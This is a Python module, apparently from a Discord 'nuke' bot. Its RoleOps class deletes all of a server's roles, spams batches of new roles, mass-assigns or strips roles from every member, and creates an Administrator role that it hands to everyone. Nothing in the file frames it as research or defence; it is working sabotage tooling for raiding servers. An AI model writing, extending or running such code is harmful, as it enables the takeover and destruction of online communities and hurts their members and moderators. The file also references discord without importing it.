import asyncio

class RoleOps:
    def __init__(self, bot):
        self.bot = bot

    async def delroles(self, guild):
        await self.bot.nuke_cmds.delete_all_roles(guild)

    async def createroles(self, guild, name, amount):
        tasks = []
        for i in range(amount):
            payload = {"name": f"{name}-{i}"}
            tasks.append(self.bot.raw_post(guild.id, "roles", json_data=payload))
            if len(tasks) >= 20:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks = []
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

    async def massrole(self, guild, role_name):
        role = discord.utils.get(guild.roles, name=role_name)
        if not role:
            return
        tasks = []
        for member in guild.members:
            if member != guild.me:
                tasks.append(member.add_roles(role))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def removerole(self, guild, role_name):
        role = discord.utils.get(guild.roles, name=role_name)
        if not role:
            return
        tasks = []
        for member in guild.members:
            if member != guild.me:
                tasks.append(member.remove_roles(role))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def adminall(self, guild):
        # Create a role with Administrator and assign to everyone
        role = await guild.create_role(name="Admin-All", permissions=discord.Permissions(administrator=True))
        tasks = []
        for member in guild.members:
            if member != guild.me:
                tasks.append(member.add_roles(role))
        await asyncio.gather(*tasks, return_exceptions=True)
